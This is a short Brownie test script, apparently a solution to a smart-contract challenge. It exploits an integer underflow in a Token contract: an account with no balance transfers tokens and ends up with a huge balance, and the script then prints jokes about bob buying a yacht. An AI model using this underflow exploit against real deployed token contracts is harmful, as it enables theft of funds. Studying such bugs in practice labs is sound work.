from brownie import accounts, Token
import pytest


# attacking the contract by using underflow
def test_token():

    owner = accounts[0]
    bob = accounts[1]
    alice = accounts[2]
    token = Token.deploy(20**10, {"from":owner})
    
    balance_before_attack = token.balanceOf(bob)
    token.transfer(alice, 21, {"from":bob})
    balance_after_attack = token.balanceOf(bob)
    assert balance_after_attack > balance_before_attack

    #fun
    if balance_after_attack > 10**10:
        print("bob is now RICHH!!, bob can now buy a YATCH!!, wohoo go bob")
    else:
        print("bob is poor, poor bob no yatch for bob")